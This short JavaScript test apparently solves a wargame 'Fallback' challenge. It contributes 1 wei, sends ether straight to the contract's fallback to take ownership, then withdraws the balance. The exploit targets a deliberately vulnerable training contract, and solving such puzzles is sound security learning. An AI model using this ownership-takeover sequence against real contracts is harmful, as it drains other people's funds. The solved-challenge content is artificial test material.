const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB")
    challenge = await ethers.getContractAt("Fallback", challengeAddress)
})

it("solves the challenge", async function () {
    tx = await challenge.contribute({
        value: ethers.utils.parseUnits("1", "wei"),
    })
    await tx.wait()

    tx = await s1.sendTransaction({
        to: challenge.address,
        value: ethers.utils.parseUnits("1", "wei"),
    })
    await tx.wait()

    tx = await challenge.withdraw()
    await tx.wait()
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
